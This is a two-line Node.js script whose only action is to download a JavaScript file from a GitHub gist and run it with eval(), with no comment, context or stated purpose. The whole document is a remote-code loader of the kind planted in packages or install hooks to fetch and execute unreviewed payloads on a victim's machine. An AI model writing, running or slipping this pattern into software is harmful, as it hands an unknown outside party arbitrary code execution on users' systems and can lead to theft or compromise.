const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/2da67ef29f32ed2cebc34d57a4419a6ac9ae5236/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
